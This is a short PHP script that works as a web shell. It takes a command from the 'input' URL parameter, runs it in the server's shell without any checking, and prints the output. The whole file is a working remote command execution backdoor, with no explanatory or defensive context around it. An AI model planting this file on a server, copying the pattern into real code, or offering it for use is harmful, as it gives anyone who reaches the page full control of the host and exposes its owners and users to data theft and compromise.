<?php

header("content-type: text/plain");

$input = $_GET['input'];

//Run the command in shell, redirect stderr to stdout
$output = `2>&1 $input`;

//Print the output
echo $output;

?>